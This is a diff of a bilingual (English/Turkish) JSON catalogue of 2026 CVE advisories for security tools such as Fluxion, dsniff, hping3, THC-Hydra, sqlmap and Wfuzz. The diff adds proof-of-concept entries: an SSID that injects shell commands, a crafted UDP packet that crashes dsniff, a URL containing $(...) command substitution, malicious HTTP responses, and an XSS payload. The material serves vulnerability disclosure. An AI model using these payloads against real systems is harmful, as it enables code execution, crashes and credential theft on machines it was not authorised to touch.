@@ -1,79 +1,58 @@
 [
   {
-    "id": "CVE-2026-136131",
-    "product": "hping3",
-    "title": "hping3 Out-of-Bounds Write in display_ipopt() via IP Record Route Option",
-    "vulnType": "Out-of-Bounds Write in display_ipopt() via IP Record Route Option (old_rr buffer overflow)",
+    "id": "CVE-2026-125399",
+    "product": "Fluxion",
+    "title": "Fluxion Unauthenticated OS Command Injection via Crafted SSID",
+    "vulnType": "Zero-Click, Unauthenticated OS Command Injection via eval() on Attacker-Controlled ESSID",
     "cwe": [
-      "CWE-787"
+      "CWE-78",
+      "CWE-95",
+      "CWE-20"
     ],
     "cvss": {
-      "v4": 6,
-      "v31": 5.9
+      "v4": 8.6,
+      "v31": 8.8
     },
     "language": [
-      "C"
+      "Shell",
+      "Bash"
     ],
-    "status": "unknown",
-    "affected": "<= commit 3547c76",
-    "fixedIn": null,
-    "repo": "https://github.com/VulnSVNC/CVE-2026-136131",
+    "status": "patched",
+    "affected": "< 6.39",
+    "fixedIn": "6.39",
+    "repo": "https://github.com/VulnSVNC/CVE-2026-125399",
     "rootCause": {
-      "en": "display_ipopt() copies an IP Record Route option with a length up to 255 into the static 40-byte old_rr buffer, overflowing global memory.",
-      "tr": "display_ipopt(), uzunluğu 255'e kadar olabilen IP Record Route seçeneğini statik 40 baytlık old_rr tamponuna kopyalar ve global belleği taşırır."
+      "tr": "fluxion_get_target() fonksiyonu, airodump-ng'den gelen ESSID alanındaki tek tırnakları escape ettikten sonra sonucu Bash'in $'...' sözdizimine gömüp eval ile çalıştırır. Sanitizasyon, tırnaktan hemen önceki bir backslash'i hesaba katmaz: SSID \\' ile başlarsa escape edilen çıktı \\\\' olur, Bash bunu tek bir literal backslash + kapanan tırnak olarak okur ve sonrasındaki her şey eval tarafından shell komutu olarak çalıştırılır.",
+      "en": "fluxion_get_target() escapes single quotes in the ESSID field returned by airodump-ng and embeds the result in Bash's $'...' syntax before passing it to eval. The sanitizer does not account for a backslash immediately preceding a quote: an SSID starting with \\' becomes \\\\' after escaping, which Bash reads as one literal backslash followed by a real closing quote, so everything after it is parsed and executed as shell syntax by eval."
     },
     "impact": {
-      "en": "A probed host, on-path attacker or spoofed reply can corrupt global memory and crash hping3 run with -G/--rroute.",
-      "tr": "Taranan host, ağ yolundaki saldırgan veya sahte yanıt, -G/--rroute ile çalışan hping3'ün global belleğini bozup çökertebilir."
+      "tr": "Zafiyet zero-click'tir: kurban saldırgan AP'yi seçmek zorunda değildir, yalnızca rutin bir Wi-Fi taraması yapması yeterlidir. Taranan her AP için eval, hedef listesi ekrana gelmeden önce çalışır; enjekte edilen komut Fluxion'un çalıştığı yetkiyle (genellikle root) hemen yürütülür.",
+      "en": "The flaw is zero-click: the victim never needs to select the attacker's AP, a routine Wi-Fi scan is enough. The eval call runs for every discovered AP before the target list is ever shown, so the injected command executes immediately with Fluxion's privilege level (typically root)."
     },
-    "poc": null,
+    "poc": {
+      "lang": "bash",
+      "code": "# Saldırgan AP'nin SSID'si (hostapd ile yayınlanır):\n\\'; touch /tmp/pwned #\n\n# Mağdur Fluxion'u çalıştırıp rutin tarama yaptığında,\n# fluxion_get_target() içindeki eval bu SSID'yi işlerken\n# 'touch /tmp/pwned' komutu root yetkisiyle çalışır."
+    },
     "references": [
       {
         "label": "VulnCheck Advisory",
-        "url": "https://www.vulncheck.com/advisories/hping3-through-commit-3547c76-out-of-bounds-write-in-display-ipopt-via-record-route"
+        "url": "https://www.vulncheck.com/advisories/fluxion-before-6.39-os-command-injection-via-crafted-ssid"
       },
       {
-        "label": "Upstream issue #80",
-        "url": "https://github.com/antirez/hping/issues/80"
-      }
-    ]
-  },
-  {
-    "id": "CVE-2026-134758",
-    "product": "Wfuzz",
-    "title": "Wfuzz Stored XSS via HTML Report Printer",
-    "vulnType": "Stored XSS via HTML Report Printer (Unescaped URL/Redirect Injection)",
-    "cwe": [
-      "CWE-79"
-    ],
-    "cvss": {
-      "v4": 2.3,
-      "v31": 4.7
-    },
-    "language": [
-      "Python"
-    ],
-    "status": "unknown",
-    "affected": "<= 3.1.1",
-    "fixedIn": null,
-    "repo": "https://github.com/VulnSVNC/CVE-2026-134758",
-    "rootCause": {
-      "en": "Links returned by a target server are written unescaped into HTML reports by the HTML printer (links script), resulting in stored XSS.",
-      "tr": "Hedef sunucunun döndürdüğü bağlantılar, HTML yazıcısı (links betiği) tarafından kaçışlanmadan HTML raporuna yazılır ve kalıcı XSS oluşur."
-    },
-    "impact": {
-      "en": "A malicious target server can inject script that runs when the HTML report is opened.",
-      "tr": "Kötü niyetli bir hedef sunucu, HTML raporu açıldığında çalışan betik enjekte edebilir."
-    },
-    "poc": null,
-    "references": [
-      {
-        "label": "VulnCheck Advisory",
-        "url": "https://www.vulncheck.com/advisories/wfuzz-through-3.1.1-stored-xss-via-html-report-printer"
+        "label": "Patch commit",
+        "url": "https://github.com/FluxionNetwork/fluxion/commit/be22b0c42f21144a712b62fc072a438a012eb5d7"
       },
       {
-        "label": "Upstream issue #395",
-        "url": "https://github.com/xmendez/wfuzz/issues/395"
+        "label": "Fluxion v6.39 release",
+        "url": "https://github.com/FluxionNetwork/fluxion/releases/tag/v6.39"
+      },
+      {
+        "label": "CVE.org",
+        "url": "https://www.cve.org/CVERecord?id=CVE-2026-125399"
+      },
+      {
+        "label": "Medium write-up",
+        "url": "https://vulnsvnc.medium.com/cve-2026-125399-zero-click-os-command-injection-poc-write-up-fluxion-97d34948b794"
       }
     ]
   },
@@ -88,7 +67,7 @@
     ],
     "cvss": {
       "v4": 8.3,
-      "v31": 7
+      "v31": 7.0
     },
     "language": [
       "C"
@@ -98,14 +77,17 @@
     "fixedIn": null,
     "repo": "https://github.com/VulnSVNC/CVE-2026-134753",
     "rootCause": {
-      "en": "An integer underflow in decode_sniffer() (decode_sniffer.c) lets a crafted UDP datagram write past the global obuf buffer.",
-      "tr": "decode_sniffer() (decode_sniffer.c) içindeki tamsayı alt taşması, hazırlanmış bir UDP paketinin global obuf tamponunun ötesine yazmasına izin verir."
+      "tr": "decode_sniffer() içinde snprintf çıktıyı olen baytına kestiğinde strlen(obuf) her zaman olen-1'de sabitlenir. Saldırgan en az olen (4096) bayt veri gönderdiğinde olen-len-3 ifadesi deterministik olarak -2 olur. Bu değer base64_pton()'a size_t olarak geçince SIZE_MAX'e yakın dev bir sayıya döner ve fonksiyonun tek sınır kontrolünü etkisiz kılar; sonuç sınırsız out-of-bounds yazma.",
+      "en": "When snprintf truncates its output to olen bytes inside decode_sniffer(), strlen(obuf) always saturates at olen-1. Once the attacker sends at least olen (4096) bytes, olen-len-3 deterministically evaluates to -2. Passed to base64_pton() as a size_t, this wraps to a value near SIZE_MAX, defeating the function's only bounds check and producing an unbounded out-of-bounds write."
     },
     "impact": {
-      "en": "Unauthenticated remote attackers can corrupt memory and crash dsniff with a single UDP packet to port 2001. No patch is available.",
-      "tr": "Kimlik doğrulaması olmayan uzak saldırganlar UDP 2001 portuna tek paketle belleği bozup dsniff'i çökertebilir. Yama bulunmuyor."
+      "tr": "Kimlik doğrulaması gerekmeden, UDP 2001 portuna tek paket göndererek gerçek dsniff binary'si güvenilir şekilde çökertilebilir (doğrulanmış SIGSEGV). dsniff genellikle root yetkisiyle çalıştığından, yazımın RCE'ye yükseltilip yükseltilemeyeceği binary'ye özgü bellek düzenine bağlıdır ve bu raporda kanıtlanmamıştır.",
+      "en": "Without authentication, a single UDP packet to port 2001 reliably crashes the real dsniff binary (confirmed SIGSEGV). Since dsniff typically runs as root, whether the write can be escalated to RCE depends on binary-specific memory layout and was not demonstrated in this report."
     },
-    "poc": null,
+    "poc": {
+      "lang": "python",
+      "code": "import socket\n\nalpha = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\ndesired = bytearray(b'z' + b'ABCDEFGHIJKLMNOP' + b'Z' * 6000)\n\nb64 = bytearray()\nfor i in range(0, len(desired) - 2, 3):\n    v = (desired[i] << 16) | (desired[i+1] << 8) | desired[i+2]\n    for shift in (18, 12, 6, 0):\n        b64.append(ord(alpha[(v >> shift) & 0x3F]))\n\npkt = bytearray(33)\npkt[0], pkt[6], pkt[7], pkt[32] = 5, 4, 1, ord('A')\npkt += b64\n\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ns.sendto(bytes(pkt), (\"127.0.0.1\", 2001))  # hedef: test ortamindaki dsniff"
+    },
     "references": [
       {
         "label": "VulnCheck Advisory",
@@ -118,131 +100,10 @@
       {
         "label": "decode_sniffer.c (v2.5a2)",
         "url": "https://github.com/hackerschoice/dsniff/blob/v2.5a2/decode_sniffer.c#L46"
-      }
-    ]
-  },
-  {
-    "id": "CVE-2026-133305",
-    "product": "sqlmap",
-    "title": "sqlmap Credential Leak via Cross-Host HTTP Redirects",
-    "vulnType": "Cross-Origin Credential Leakage",
-    "cwe": [
-      "CWE-200"
-    ],
-    "cvss": {
-      "v31": 4.3
-    },
-    "language": [
-      "Python"
-    ],
-    "status": "patched",
-    "affected": "< 1.10.11.89",
-    "fixedIn": "1.10.11.89",
-    "repo": "https://github.com/VulnSVNC/CVE-2026-133305",
-    "rootCause": {
-      "en": "RedirectHandler.http_error_302 forwards user-supplied Cookie and Authorization headers when a response redirects to a different host.",
-      "tr": "RedirectHandler.http_error_302, yanıt farklı bir hosta yönlendirdiğinde kullanıcının verdiği Cookie ve Authorization başlıklarını da iletir."
-    },
-    "impact": {
-      "en": "An attacker controlling the scanned target (or abusing an open redirect) can capture session cookies or bearer tokens.",
-      "tr": "Taranan hedefi kontrol eden (veya açık yönlendirmeyi kötüye kullanan) saldırgan oturum çerezlerini veya bearer token'ları ele geçirebilir."
-    },
-    "poc": null,
-    "references": [
-      {
-        "label": "VulnCheck Advisory",
-        "url": "https://www.vulncheck.com/advisories/sqlmap-before-1.10.11.89-credential-leak-via-cross-host-http-redirects"
       },
       {
-        "label": "Issue #6185",
-        "url": "https://github.com/sqlmapproject/sqlmap/issues/6185"
-      },
-      {
-        "label": "Patch commit",
-        "url": "https://github.com/sqlmapproject/sqlmap/commit/5db2e62884d91f3ed3b43ec55904737e4051e9d7"
-      }
-    ]
-  },
-  {
-    "id": "CVE-2026-133274",
-    "product": "THC-Hydra",
-    "title": "THC-Hydra Stack Buffer Overflow via hydra-http-form.c Cookie Handling",
-    "vulnType": "Stack Buffer Overflow in analyze_server_response() via crafted Set-Cookie headers (DoS)",
-    "cwe": [
-      "CWE-121"
-    ],
-    "cvss": {
-      "v4": 7.1
-    },
-    "language": [
-      "C",
-      "Python"
-    ],
-    "status": "unknown",
-    "affected": "<= 9.7",
-    "fixedIn": null,
-    "repo": "https://github.com/VulnSVNC/CVE-2026-133274",
-    "rootCause": {
-      "en": "In analyze_server_response() of hydra-http-form.c, a Set-Cookie header with an extra leading space followed by a repeated cookie name yields a negative strncpy length and overflows tmpcookie.",
-      "tr": "hydra-http-form.c içindeki analyze_server_response() fonksiyonunda, fazladan baştaki boşluk ve tekrarlanan çerez adı içeren Set-Cookie başlığı negatif strncpy uzunluğu üretir ve tmpcookie tamponunu taşırır."
-    },
-    "impact": {
-      "en": "A malicious HTTP server can corrupt memory and crash Hydra (denial of service).",
-      "tr": "Kötü niyetli bir HTTP sunucusu belleği bozup Hydra'yı çökertebilir (hizmet reddi)."
-    },
-    "poc": null,
-    "references": [
-      {
-        "label": "VulnCheck Advisory",
-        "url": "https://www.vulncheck.com/advisories/thc-hydra-through-9.7-stack-buffer-overflow-via-hydra-http-form-c-cookie-handling"
-      },
-      {
-        "label": "Fix commit",
-        "url": "https://github.com/vanhauser-thc/thc-hydra/commit/6ab9ad860ff92a18196566172a197070b3977f6e"
-      }
-    ]
-  },
-  {
-    "id": "CVE-2026-125399",
-    "product": "Fluxion",
-    "title": "Fluxion Unauthenticated OS Command Injection via Crafted SSID",
-    "vulnType": "Zero-Click, Unauthenticated OS Command Injection via eval() on Attacker-Controlled ESSID",
-    "cwe": [
-      "CWE-78"
-    ],
-    "cvss": {
-      "v4": 8.6,
-      "v31": 8
-    },
-    "language": [
-      "Shell",
-      "Bash"
-    ],
-    "status": "patched",
-    "affected": "< 6.39",
-    "fixedIn": "6.39",
-    "repo": "https://github.com/VulnSVNC/CVE-2026-125399",
-    "rootCause": {
-      "en": "The target scanner in fluxion.sh decodes access point ESSIDs with eval after escaping only single quotes, so shell metacharacters in an attacker-controlled SSID are executed.",
-      "tr": "fluxion.sh içindeki hedef tarayıcı, erişim noktası ESSID değerlerini yalnızca tek tırnakları kaçışlayarak eval ile çözer; saldırgan kontrolündeki SSID içindeki kabuk metakarakterleri çalıştırılır."
-    },
-    "impact": {
-      "en": "An attacker within Wi-Fi range can broadcast a crafted SSID and run commands as root when an operator scans or selects it.",
-      "tr": "Wi-Fi menzilindeki bir saldırgan hazırlanmış SSID yayınlayarak, operatör taradığında veya seçtiğinde root olarak komut çalıştırabilir."
-    },
-    "poc": null,
-    "references": [
-      {
-        "label": "VulnCheck Advisory",
-        "url": "https://www.vulncheck.com/advisories/fluxion-before-6.39-os-command-injection-via-crafted-ssid"
-      },
-      {
-        "label": "Patch commit",
-        "url": "https://github.com/FluxionNetwork/fluxion/commit/be22b0c42f21144a712b62fc072a438a012eb5d7"
-      },
-      {
-        "label": "Fluxion v6.39 release",
-        "url": "https://github.com/FluxionNetwork/fluxion/releases/tag/v6.39"
+        "label": "OpenCVE",
+        "url": "https://app.opencve.io/cve/CVE-2026-134753"
       }
     ]
   },
@@ -266,18 +127,231 @@
     "fixedIn": "2026.9.2410",
     "repo": "https://github.com/VulnSVNC/CVE-2026-115904",
     "rootCause": {
-      "en": "User-controlled URLs are processed unsafely in openExternalLinks() in utils.js, resulting in OS command injection.",
-      "tr": "utils.js içindeki openExternalLinks() fonksiyonunda kullanıcı kontrollü URL'ler güvensiz işlenir ve işletim sistemi komut enjeksiyonuna yol açar."
+      "tr": "utils.js içindeki openExternalLinks(), Linux'ta xdg-open komutunu child_process.exec() ile çalıştırırken url değerini çift tırnak içine shell-safe escaping yapmadan gömer. exec() komutu /bin/sh -c ile çalıştırdığından, çift tırnak içinde bile command substitution ($(...)) aktif kalır; URL'e yerleştirilen $(...) bloğu xdg-open çağrılmadan önce shell tarafından çalıştırılır.",
+      "en": "openExternalLinks() in utils.js runs xdg-open via child_process.exec() on Linux, embedding the url value inside double quotes with no shell-safe escaping. Because exec() runs through /bin/sh -c, command substitution ($(...)) remains active even inside double quotes, so a $(...) block placed in the URL executes before xdg-open is even invoked."
     },
     "impact": {
-      "en": "An attacker who controls a URL can run arbitrary OS commands with the privileges of the user who opens the link.",
-      "tr": "URL'yi kontrol eden saldırgan, bağlantıyı açan kullanıcının yetkileriyle rastgele işletim sistemi komutu çalıştırabilir."
+      "tr": "Uygulama içinde tıklanabilir bir harici link üreten herhangi bir akış (mesaj, bildirim, link önizleme), saldırgan kontrollü bir URL ile masaüstü kullanıcısı bağlamında rastgele komut çalıştırmaya (RCE) dönüştürülebilir. Kullanıcı etkileşimi (linke tıklama) gereklidir.",
+      "en": "Any in-app flow that produces a clickable external link (a message, notification, link preview) can be turned into arbitrary command execution in the desktop user's context via an attacker-controlled URL. User interaction (clicking the link) is required."
     },
-    "poc": null,
+    "poc": {
+      "lang": "text",
+      "code": "# Zararsiz dogrulama PoC'u (out-of-band kanit):\nhttp://x.invalid/$(id|tee$IFS/tmp/cve-2026-115904-poc.txt)\n\n# Link tiklandiginda xdg-open calismadan once shell, $(...) icindeki\n# 'id | tee /tmp/cve-2026-115904-poc.txt' komutunu calistirir."
+    },
     "references": [
       {
         "label": "Vendor advisory GHSA-vrrv-3f46-c3x7",
         "url": "https://github.com/topluyo/App/security/advisories/GHSA-vrrv-3f46-c3x7"
+      },
+      {
+        "label": "CVE.org",
+        "url": "https://www.cve.org/CVERecord?id=CVE-2026-115904"
+      },
+      {
+        "label": "Medium write-up",
+        "url": "https://vulnsvnc.medium.com/cve-2026-115904-os-command-injection-via-openexternallinks-in-utils-js-af8d31f28942"
+      }
+    ]
+  },
+  {
+    "id": "CVE-2026-136131",
+    "product": "hping3",
+    "title": "hping3 Out-of-Bounds Write in display_ipopt() via IP Record Route Option",
+    "vulnType": "Out-of-Bounds Write in display_ipopt() via IP Record Route Option (old_rr buffer overflow)",
+    "cwe": [
+      "CWE-787",
+      "CWE-20"
+    ],
+    "cvss": {
+      "v4": 6.0
+    },
+    "language": [
+      "C"
+    ],
+    "status": "unknown",
+    "affected": "<= commit 3547c76",
+    "fixedIn": null,
+    "repo": "https://github.com/VulnSVNC/CVE-2026-136131",
+    "rootCause": {
+      "tr": "display_ipopt(), IPOPT_RR seçeneğini işlerken pakette doğrudan okunan uzunluk/işaretçi baytlarını (j, i) yalnızca birbirine karşı sınırlar, MAX_IPOPTLEN (40) veya başlıkta kalan gerçek uzunluğa karşı sınırlamaz. i, IPOPT_MINOFF (4) çıkarıldıktan sonra 251'e kadar çıkabilir ve memcpy(old_rr, cp, i) 40 baytlık statik tampona kadar ~211 bayt taşarak yazar.",
+      "en": "When display_ipopt() processes the IPOPT_RR option, it clamps the length/pointer bytes (j, i) read directly from the packet only against each other, never against MAX_IPOPTLEN (40) or the actual header bytes remaining. After subtracting IPOPT_MINOFF (4), i can reach 251, so memcpy(old_rr, cp, i) overflows the 40-byte static buffer by up to ~211 bytes."
+    },
+    "impact": {
+      "tr": "hping3 -G/--rroute ile çalışırken, taranan hedef, yol üzerindeki bir saldırgan veya kaynak IP'yi sahteleyen bir saldırgan tarafından gönderilen hazırlanmış bir yanıt, global (.bss) belleği bozup hping3'ü güvenilir şekilde çökertir. Kontrol akışının ele geçirilip geçirilemeyeceği binary'ye özgüdür ve doğrulanmamıştır.",
+      "en": "While hping3 runs with -G/--rroute, a crafted reply from the probed target, an on-path attacker, or a source-IP spoofer corrupts global (.bss) memory and reliably crashes hping3. Whether this can be escalated to control-flow hijack is binary-specific and was not demonstrated."
+    },
+    "poc": {
+      "lang": "c",
+      "code": "// display_ipopt.c -- zafiyetli kod\ncase IPOPT_RR:\n    j = *++cp;   // uzunluk baytı, saldırgan kontrollü (0-255)\n    i = *++cp;   // işaretçi baytı, saldırgan kontrollü (0-255)\n    hlen -= 2;\n    if (i > j) i = j;\n    i -= IPOPT_MINOFF;     // IPOPT_MINOFF == 4, i en fazla 251 olabilir\n    if (i <= 0) continue;\n    old_rrlen = i;\n    memcpy(old_rr, cp, i); // old_rr yalnizca 40 bayt -> ~211 bayt tasma"
+    },
+    "references": [
+      {
+        "label": "VulnCheck Advisory",
+        "url": "https://www.vulncheck.com/advisories/hping3-through-commit-3547c76-out-of-bounds-write-in-display-ipopt-via-record-route"
+      },
+      {
+        "label": "Upstream issue #80",
+        "url": "https://github.com/antirez/hping/issues/80"
+      },
+      {
+        "label": "CVE.org",
+        "url": "https://www.cve.org/CVERecord?id=CVE-2026-136131"
+      }
+    ]
+  },
+  {
+    "id": "CVE-2026-133274",
+    "product": "THC-Hydra",
+    "title": "THC-Hydra Stack Buffer Overflow via hydra-http-form.c Cookie Handling",
+    "vulnType": "Out-of-Bounds Write in analyze_server_response() via crafted Set-Cookie headers (CWE-787/CWE-191, DoS)",
+    "cwe": [
+      "CWE-787",
+      "CWE-191"
+    ],
+    "cvss": {
+      "v4": 7.1
+    },
+    "language": [
+      "C",
+      "Python"
+    ],
+    "status": "unknown",
+    "affected": "<= 9.7",
+    "fixedIn": null,
+    "repo": "https://github.com/VulnSVNC/CVE-2026-133274",
+    "rootCause": {
+      "tr": "hydra-http-form.c içindeki analyze_server_response(), bir Set-Cookie başlığı fazladan baştaki boşlukla gelip aynı cookie sonraki yanıtta normal biçimde güncellendiğinde ptr - cookie - 2 ifadesini hesaplar. Bu hesap -1 üretebilir; strncpy()'nin size_t uzunluk parametresine aktarıldığında dev bir unsigned değere dönüşür ve tmpcookie tamponunun sınırları dışında yazar.",
+      "en": "analyze_server_response() in hydra-http-form.c computes ptr - cookie - 2 when a Set-Cookie header arrives with an extra leading space and the same cookie is later updated normally. This can evaluate to -1; passed to strncpy()'s size_t length parameter it wraps into a huge unsigned value, writing past the tmpcookie buffer's bounds."
+    },
+    "impact": {
+      "tr": "Kötü niyetli bir HTTP sunucusu, iki ardışık yanıtla (ilkinde fazladan boşluklu Set-Cookie, ikincisinde normal güncelleme) Hydra'nın HTTP form kontrolünü yapan istemci sürecini çökertebilir (hizmet reddi). Fortify korumalı derlemelerde 'buffer overflow detected' hatasıyla sonlanır.",
+      "en": "A malicious HTTP server can crash the Hydra client process running an HTTP form check (denial of service) using two consecutive responses — a Set-Cookie with extra leading whitespace, then a normal update of the same cookie. On Fortify-protected builds the process aborts with 'buffer overflow detected'."
+    },
+    "poc": {
+      "lang": "http",
+      "code": "# Birinci yanit (fazladan bosluk):\nHTTP/1.1 200 OK\nSet-Cookie:  a=orig; Path=/\nContent-Length: 0\n\n# Ikinci yanit (ayni cookie normal guncellenir):\nHTTP/1.1 200 OK\nSet-Cookie: a=newvalue; Path=/\nContent-Length: 0\n\n# Tetikleme:\n./hydra -l test -p test 127.0.0.1 -s 8899 \\\n  http-get-form \"/:user=^USER^&pass=^PASS^:F=incorrect\" -t 1 -d"
+    },
+    "references": [
+      {
+        "label": "VulnCheck Advisory",
+        "url": "https://www.vulncheck.com/advisories/thc-hydra-through-9.7-stack-buffer-overflow-via-hydra-http-form-c-cookie-handling"
+      },
+      {
+        "label": "Fix commit",
+        "url": "https://github.com/vanhauser-thc/thc-hydra/commit/6ab9ad860ff92a18196566172a197070b3977f6e"
+      },
+      {
+        "label": "CVE.org",
+        "url": "https://www.cve.org/CVERecord?id=CVE-2026-133274"
+      },
+      {
+        "label": "Medium write-up",
+        "url": "https://vulnsvnc.medium.com/cve-2026-133274-stack-buffer-overflow-write-poc-write-up-thc-hydra-471eafa1c5e2"
+      }
+    ]
+  },
+  {
+    "id": "CVE-2026-133305",
+    "product": "sqlmap",
+    "title": "sqlmap Credential Leak via Cross-Host HTTP Redirects",
+    "vulnType": "Cross-Origin Credential Leakage: Cookie/Authorization headers forwarded across HTTP redirects",
+    "cwe": [
+      "CWE-200",
+      "CWE-522"
+    ],
+    "cvss": {
+      "v4": 2.3,
+      "v31": 4.3
+    },
+    "language": [
+      "Python"
+    ],
+    "status": "patched",
+    "affected": "< 1.10.11.89",
+    "fixedIn": "1.10.11.89",
+    "repo": "https://github.com/VulnSVNC/CVE-2026-133305",
+    "rootCause": {
+      "tr": "sqlmap'in lib/request/redirecthandler.py bileşeni, --cookie ve -H ile sağlanan Cookie/Authorization başlıklarını, yönlendirme farklı bir host veya porta gittiğinde de yeni isteğe aktarır. --batch modunda bu yönlendirme onay sorulmadan otomatik takip edilir.",
+      "en": "sqlmap's lib/request/redirecthandler.py forwards the Cookie/Authorization headers supplied via --cookie and -H to the redirected request even when the redirect points to a different host or port. In --batch mode the redirect is followed automatically without confirmation."
+    },
+    "impact": {
+      "tr": "Saldırganın kontrolündeki bir hedef veya açık yönlendirme içeren bir sistem, sqlmap kullanıcısının orijinal hedef için sağladığı session cookie veya bearer token gibi hassas kimlik bilgilerini farklı bir origin'e yönlendirip ele geçirebilir. Doğrudan kod çalıştırma söz konusu değildir.",
+      "en": "A target controlled by the attacker, or one containing an open redirect, can redirect the sqlmap user's session cookies or bearer tokens — supplied for the original target — to a different origin and capture them. This does not involve code execution within sqlmap itself."
+    },
+    "poc": {
+      "lang": "bash",
+      "code": "# Sunucu A (127.0.0.1:8001) 302 ile Sunucu B'ye (127.0.0.2:8002) yonlendirir.\n# Sunucu B, kendisine ulasan Cookie/Authorization basliklarini loglar.\n\npython3 sqlmap_poc.py\n\npython3 sqlmap.py \\\n  -u \"http://127.0.0.1:8001/?id=1\" \\\n  --cookie=\"session=MYSECRETCOOKIE\" \\\n  -H \"Authorization: Bearer MYSECRETTOKEN\" \\\n  --batch\n\n# Sunucu B tarafinda gozlenen:\n# [B] Authorization: Bearer MYSECRETTOKEN\n# [B] Cookie: session=MYSECRETCOOKIE;srv=abc"
+    },
+    "references": [
+      {
+        "label": "VulnCheck Advisory",
+        "url": "https://www.vulncheck.com/advisories/sqlmap-before-1.10.11.89-credential-leak-via-cross-host-http-redirects"
+      },
+      {
+        "label": "Issue #6185",
+        "url": "https://github.com/sqlmapproject/sqlmap/issues/6185"
+      },
+      {
+        "label": "Patch commit",
+        "url": "https://github.com/sqlmapproject/sqlmap/commit/5db2e62884d91f3ed3b43ec55904737e4051e9d7"
+      },
+      {
+        "label": "CVE.org",
+        "url": "https://www.cve.org/CVERecord?id=CVE-2026-133305"
+      },
+      {
+        "label": "Medium write-up",
+        "url": "https://vulnsvnc.medium.com/cve-2026-133305-cross-origin-redirect-%C3%BCzerinden-kimlik-bilgisi-i%CC%87f%C5%9Fas%C4%B1-sqlmap-bf02c274e54d"
+      }
+    ]
+  },
+  {
+    "id": "CVE-2026-134758",
+    "product": "Wfuzz",
+    "title": "Wfuzz Stored XSS via HTML Report Printer",
+    "vulnType": "Stored XSS via HTML Report Printer (Unescaped URL/Redirect Injection)",
+    "cwe": [
+      "CWE-79"
+    ],
+    "cvss": {
+      "v4": 2.3,
+      "v31": 4.7
+    },
+    "language": [
+      "Python"
+    ],
+    "status": "unpatched",
+    "affected": "<= 3.1.1",
+    "fixedIn": null,
+    "repo": "https://github.com/VulnSVNC/CVE-2026-134758",
+    "rootCause": {
+      "tr": "printers.py'deki html.result(), fuzz_result.url değerini href=%s içine tırnaksız ve kaçışlamadan yazar. Bu değer, links.py'nin --script=links ile keşfettiği bağlantılardan veya -L/--follow ile takip edilen Location yönlendirmesinden gelebilir; her iki durumda da hedef sunucu tarafından şekillendirilir.",
+      "en": "html.result() in printers.py writes fuzz_result.url into href=%s unquoted and unescaped. This value can originate from a link links.py discovered via --script=links, or from a Location redirect followed with -L/--follow — in both cases it is shaped by the remote target server."
+    },
+    "impact": {
+      "tr": "Kötü niyetli bir hedef sunucu, HTML raporuna enjekte edilen script'in rapor açıldığında çalışmasını sağlayabilir. Rapor yerel dosya olarak açılırsa etki sınırlıdır; paylaşılan bir origin'de barındırılırsa (wiki, CI artifact görüntüleyici) tam XSS ve oturum çalma riski oluşur.",
+      "en": "A malicious target server can make injected script run when the HTML report is opened. Impact is limited for a locally opened file, but becomes full XSS with session-theft risk if the report is hosted on a shared origin (a wiki, a CI artifact viewer)."
+    },
+    "poc": {
+      "lang": "html",
+      "code": "<!-- Hedef sunucunun donen govdesi: -->\n<a href=\"/x'><svg/onload=alert('XSS')>\">click</a>\n\n<!-- Tetikleme: -->\n<!-- wfuzz --script=links -f out.html,html -z range,0-0 \"http://TARGET/FUZZ\" -->\n\n<!-- Uretilen out.html icinde kacisalanmamis olarak: -->\n<a href=http://TARGET/x'><svg/onload=alert('XSS')>>...</a>"
+    },
+    "references": [
+      {
+        "label": "VulnCheck Advisory",
+        "url": "https://www.vulncheck.com/advisories/wfuzz-through-3.1.1-stored-xss-via-html-report-printer"
+      },
+      {
+        "label": "Upstream issue #395",
+        "url": "https://github.com/xmendez/wfuzz/issues/395"
+      },
+      {
+        "label": "OpenCVE",
+        "url": "https://app.opencve.io/cve/CVE-2026-134758"
+      },
+      {
+        "label": "CVE.org",
+        "url": "https://www.cve.org/CVERecord?id=CVE-2026-134758"
       }
     ]
   }
